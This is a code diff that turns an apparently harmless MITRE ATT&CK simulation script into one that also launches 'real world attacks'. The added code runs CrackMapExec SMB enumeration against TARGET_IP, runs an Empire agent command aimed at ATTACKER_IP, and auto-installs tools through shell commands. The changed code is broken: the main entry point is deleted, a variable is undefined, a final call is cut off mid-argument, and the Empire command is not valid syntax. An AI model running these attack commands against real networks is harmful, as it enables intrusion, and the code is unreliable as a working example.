@@ -1,5 +1,5 @@
 ######################################################################################################################################################################################################################
-# Python adversary emulation simulator, in line with the MITRE ATT&CK Framerwork. sudo python3 mitre_att&ck.py. Requires a linux virtual environment. Performs non-destructive simulations based on selections. 
+# Python adversary emulation simulator, in line with the MITRE ATT&CK Framerwork. sudo python3 mitre_att&ck.py. Requires a linux virtual environment. Performs simulations or real world attacks based on selections. 
 # Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software 
 # without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons 
 # to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial 
@@ -11,13 +11,51 @@
 
 import json
 import requests
+import subprocess
 import time
 import os
+
+# Disclaimer to ensure ethical use
+def display_disclaimer():
+    print("""
+    WARNING: This script contains functionality for both penetration testing and simulation of APT groups.
+    
+    By using this tool, you acknowledge and agree that:
+    - You have explicit permission to conduct penetration tests on the target systems.
+    - You will not use this tool for unauthorised access or malicious activities.
+    - You understand the potential risks involved in executing real penetration tests, including system disruption or data loss.
+    - The authors of this tool is not responsible for any damage or legal consequences resulting from its use.
+    
+    Proceeding without proper authorisation is illegal and unethical. Do you acknowledge and accept these terms? (y/n)
+    """)
+
+    response = input("Enter 'y' to accept or 'n' to decline: ").lower()
+    if response != 'y':
+        print("[ERROR] You must accept the disclaimer to continue.")
+        exit(1)
+    else:
+        print("[INFO] You have accepted the disclaimer. Proceeding...")
 
 # MITRE ATT&CK data URL (latest JSON dataset)
 ATTACK_DATA_URL = "https://raw.githubusercontent.com/mitre/cti/master/enterprise-attack/enterprise-attack.json"
 
-# Load the MITRE ATT&CK data (download it if necessary)
+# Tool check and installation function
+def check_tool_installed(tool_name, install_command):
+    """Check if a tool is installed, prompt to install if not."""
+    try:
+        subprocess.check_call([tool_name, '--version'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        print(f"[INFO] {tool_name} is already installed.")
+    except subprocess.CalledProcessError:
+        print(f"[ERROR] {tool_name} is not installed.")
+        install = input(f"Do you want to install {tool_name}? (y/n): ").lower()
+        if install == 'y':
+            print(f"[INFO] Installing {tool_name}...")
+            subprocess.check_call(install_command, shell=True)
+        else:
+            print(f"[ERROR] {tool_name} is required for Penetration Testing Mode. Exiting.")
+            exit(1)
+
+# Download MITRE ATT&CK data if not already downloaded
 def download_attack_data():
     response = requests.get(ATTACK_DATA_URL)
     if response.status_code == 200:
@@ -77,8 +115,72 @@ def generate_html_report(apt_group, techniques):
         report_file.write("</ul></body></html>")
     print(f"[INFO] Report generated: {apt_group}_report.html")
 
-# Main simulation function
+# Execute penetration testing attack (using CrackMapExec or Empire)
+def execute_attack_tool(group, technique):
+    """Execute real attack tools (e.g., CrackMapExec, Empire) based on selected group and technique."""
+    print(f"[INFO] Executing attack using {technique} for APT Group: {group}...")
+    
+    if 'CrackMapExec' in technique:
+        # Example of running CrackMapExec (adjust based on technique)
+        subprocess.run(['crackmapexec', 'smb', 'TARGET_IP', '--shares'])
+    elif 'Empire' in technique:
+        # Example of running Empire (adjust based on technique)
+        subprocess.run(['empire', '--agent', 'ATTACKER_IP', '--target', 'TARGET_IP'])
+    else:
+        print(f"[ERROR] No matching tool for technique: {technique}")
+
+# Penetration testing mode function
+def run_penetration_testing():
+    """Penetration testing using real tools (CrackMapExec, Empire)."""
+    # Ensure tools are installed
+    check_tool_installed('crackmapexec', 'pip install crackmapexec')
+    check_tool_installed('empire', 'pip install empire')
+    
+    # Select APT group and techniques for attack
+    apt_groups = display_apt_groups(data)
+    apt_group_selection = int(input(f"\nEnter selection (1-{len(apt_groups)}): "))
+    selected_group = apt_groups[apt_group_selection - 1]
+    print(f"[INFO] You selected: {selected_group}")
+    
+    techniques = display_techniques(data, selected_group)
+    selected_techniques = []
+    while True:
+        technique_selection = int(input(f"\nSelect a technique (1-{len(techniques)}), or 0 to finish: "))
+        if technique_selection == 0:
+            break
+        selected_technique = techniques[technique_selection - 1]
+        selected_techniques.append(selected_technique)
+        execute_attack_tool(selected_group, selected_technique)
+
+    # Report Generation (same as simulation)
+    report_format = input("Generate report in text or HTML format? (text/html): ").lower()
+    if report_format == 'text':
+        generate_text_report(selected_group, selected_techniques)
+    elif report_format == 'html':
+        generate_html_report(selected_group, selected_techniques)
+    else:
+        print("[ERROR] Invalid report format.")
+
+# Mode selection function
+def select_mode():
+    """Allow the user to select between simulation and penetration testing mode."""
+    print("\nSelect Mode:")
+    print("1. Simulation Mode (ATT&CK-based)")
+    print("2. Penetration Testing Mode (Real Attacks using tools)")
+
+    mode = int(input("Enter selection (1 or 2): "))
+    
+    if mode == 1:
+        run_simulation()  # Existing simulation function
+    elif mode == 2:
+        run_penetration_testing()  # New penetration testing function
+    else:
+        print("[ERROR] Invalid mode selected.")
+        exit(1)
+
+# Simulation Mode function
 def run_simulation():
+    """Run the MITRE ATT&CK simulation."""
     # Step 1: Check if ATT&CK data exists or download it
     if not os.path.exists('attack_data.json'):
         print("[INFO] ATT&CK data not found. Downloading...")
@@ -105,12 +207,4 @@ def run_simulation():
     # Step 4: Report Generation
     report_format = input("Generate report in text or HTML format? (text/html): ").lower()
     if report_format == 'text':
-        generate_text_report(selected_group, selected_techniques)
-    elif report_format == 'html':
-        generate_html_report(selected_group, selected_techniques)
-    else:
-        print("[ERROR] Invalid report format.")
-
-if __name__ == "__main__":
-    run_simulation()
-
+        generate_text_report(selected_group,
